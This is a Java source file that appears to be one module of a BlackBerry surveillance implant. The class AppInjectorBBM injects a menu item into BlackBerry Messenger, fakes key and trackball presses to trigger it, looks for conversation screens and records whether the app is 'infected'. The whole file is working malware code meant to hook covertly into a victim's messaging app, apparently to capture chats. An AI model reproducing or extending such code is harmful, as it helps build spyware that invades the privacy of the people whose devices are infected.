package blackberry.agent.im;

import net.rim.device.api.system.RuntimeStore;
import net.rim.device.api.ui.Keypad;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.injection.AppInjectorInterface;
import blackberry.injection.KeyInjector;
import blackberry.interfaces.Singleton;
import blackberry.utils.Utils;

public class AppInjectorBBM implements AppInjectorInterface, Singleton {
    //#ifdef DEBUG
    private static Debug debug = new Debug("AppInjectorBBM", DebugLevel.VERBOSE);
    //#endif
    
    private static AppInjectorBBM instance;
    private static final long GUID = 0xcb37fa94a62baf5dL;

    public static synchronized AppInjectorBBM getInstance() {
        if (instance == null) {
            instance = (AppInjectorBBM) RuntimeStore.getRuntimeStore()
                    .get(GUID);
            if (instance == null) {
                final AppInjectorBBM singleton = new AppInjectorBBM();

                RuntimeStore.getRuntimeStore().put(GUID, singleton);
                instance = singleton;
            }
        }
        return instance;
    }

    BBMMenuItem menu = BBMMenuItem.getInstance();

    public boolean requestForeground() {
        return false;
    }

    public boolean injectMenu() {
        //#ifdef DEBUG
        debug.trace("injectMenu");
        //#endif
        menu.addMenuBBM();
        return true;
    }

    public boolean deleteMenu() {
        //#ifdef DEBUG
        debug.trace("deleteMenu");
        //#endif
        menu.removeMenuBBM();
        return true;
    }

    public boolean callMenuByKey(int kind) {
        //#ifdef DEBUG
        debug.info("calling browser menu");
        //#endif

        
        //KeyInjector.pressKeyCode(Keypad.KEY_MENU);
       
        if(kind % 2 ==0){
            //#ifdef DEBUG
            debug.trace("callMenuByKey press raw key");
            //#endif
            KeyInjector.pressRawKeyCode(Keypad.KEY_MENU);
            Utils.sleep(100);
            KeyInjector.pressRawKey(menu.toString().toLowerCase().charAt(0));
            Utils.sleep(100);
            KeyInjector.trackBallRawClick();
            //KeyInjector.trackBallClick();
        }else{
            //#ifdef DEBUG
            debug.trace("callMenuByKey press key");
            //#endif
            KeyInjector.pressKeyCode(Keypad.KEY_MENU);
            Utils.sleep(500);
            KeyInjector.pressKey(menu.toString().toLowerCase().charAt(0));
            Utils.sleep(500);
            KeyInjector.trackBallClick();
        }

        return true;
    }


    public String getAppName() {

        return "Messenger";
    }


    public void callMenuInContext() {
        //#ifdef DEBUG
        debug.trace("callMenuInContext");
        //#endif
        BBMMenuItem.getInstance().checkForConversationScreen();
        
    }
    
    boolean infected;
    public boolean isInfected() {
        
        return infected;
    }

    public void setInfected() {
       infected = true;
    }

}
